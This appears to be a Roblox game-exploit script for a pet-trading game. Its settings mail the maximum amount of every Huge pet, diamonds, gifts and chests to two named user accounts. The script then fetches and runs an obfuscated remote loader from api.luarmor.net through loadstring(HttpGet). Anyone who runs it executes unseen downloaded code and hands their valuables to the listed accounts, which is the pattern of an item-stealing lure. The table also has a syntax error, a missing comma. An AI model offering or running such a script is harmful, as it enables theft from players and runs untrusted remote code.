getgenv().Settings = {
    Mailing = {
        ["All Huges"] = {Class = "Pet", Amount =  "Max", AllTypes = true},
        ["Graffiti Gift"] = {Class = "Misc", Amount =  "Max"},
        ["Mini Chest"] = {Class = "Misc", Amount = "Max"},
        ["Diamonds"] = {Class = "Currency", Amount =  "Max"}
        ["Rainbow Huge Cat"] = {Class = "Pet", Amount = "Max"}
    },
    Users = {
        "kenchuboy2k",
        "kingltntest",
    },
    ["Split Items Evenly"] = true, --// False -> it will send the Amount per account.
    ["Only Online Accounts"] = true,
}
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/86847850c3165379f5be2d9d071eaccb.lua"))()
